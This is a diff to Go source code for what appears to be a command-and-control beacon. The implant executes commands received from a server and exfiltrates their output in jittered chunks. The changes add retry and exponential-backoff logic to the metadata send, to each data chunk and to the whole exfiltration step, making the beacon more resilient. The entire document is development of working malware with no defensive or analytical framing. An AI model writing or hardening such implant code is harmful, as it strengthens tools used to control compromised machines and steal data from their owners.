@@ -134,13 +134,27 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 		return err
 	}
 
-	// Phase 1: Send metadata about the incoming chunked result
+	// Phase 1: Send metadata about the incoming chunked result with retries
 	totalChunks := (len(result) + safeRawChunk - 1) / safeRawChunk
 
 	metaData := fmt.Sprintf("RESULT_META|%s|%s|%d|%d", b.id, taskID, len(result), totalChunks)
-	_, err := b.client.sendCommand(metaData)
-	if err != nil {
-		return fmt.Errorf("failed to send result metadata: %v", err)
+	
+	// Retry metadata send up to 3 times - critical for establishing expectation
+	var err error
+	metaSent := false
+	for metaAttempt := 1; metaAttempt <= 3; metaAttempt++ {
+		_, err = b.client.sendCommand(metaData)
+		if err == nil {
+			metaSent = true
+			break
+		}
+		if metaAttempt < 3 {
+			time.Sleep(time.Duration(metaAttempt) * time.Second)
+		}
+	}
+	
+	if !metaSent {
+		return fmt.Errorf("failed to send result metadata after 3 attempts: %v", err)
 	}
 
 	// Get jitter configuration
@@ -163,7 +177,8 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 		burstPause = 5000 // 5 seconds
 	}
 
-	// Phase 2: Send the actual data chunks with burst-based jitter
+	// Phase 2: Send the actual data chunks with burst-based jitter and per-chunk retry
+	failedChunks := 0
 	for i := 0; i < totalChunks; i++ {
 		start := i * safeRawChunk
 		end := start + safeRawChunk
@@ -173,9 +188,25 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 
 		chunk := result[start:end]
 		chunkData := fmt.Sprintf("DATA|%s|%s|%d|%s", b.id, taskID, i+1, chunk)
-		_, err := b.client.sendCommand(chunkData)
-		if err != nil {
-			return fmt.Errorf("failed to send data chunk %d/%d: %v", i+1, totalChunks, err)
+		
+		// Retry each chunk up to 2 times before giving up
+		chunkSent := false
+		for chunkAttempt := 1; chunkAttempt <= 2; chunkAttempt++ {
+			_, err := b.client.sendCommand(chunkData)
+			if err == nil {
+				chunkSent = true
+				break
+			}
+			// Brief pause before retry
+			if chunkAttempt < 2 {
+				time.Sleep(500 * time.Millisecond)
+			}
+		}
+		
+		if !chunkSent {
+			failedChunks++
+			// Don't abort immediately - try to send remaining chunks
+			// Server can handle partial results
 		}
 
 		// Apply delay after each burst
@@ -190,6 +221,10 @@ func (b *Beacon) exfiltrateResult(result string, taskID string) error {
 		}
 	}
 
+	if failedChunks > 0 {
+		return fmt.Errorf("failed to send %d/%d chunks", failedChunks, totalChunks)
+	}
+	
 	return nil
 }
 
@@ -244,8 +279,19 @@ func (b *Beacon) runBeacon() {
 			// Execute the command
 			result := b.executeCommand(command)
 
-			// Exfiltrate the result
-			_ = b.exfiltrateResult(result, taskID)
+			// Exfiltrate the result with retries
+			maxRetries := 3
+			for attempt := 1; attempt <= maxRetries; attempt++ {
+				err := b.exfiltrateResult(result, taskID)
+				if err == nil {
+					break // Success
+				}
+				// Failed - retry with exponential backoff
+				if attempt < maxRetries {
+					backoff := time.Duration(attempt*2) * time.Second
+					time.Sleep(backoff)
+				}
+			}
 		}
 	}
 }
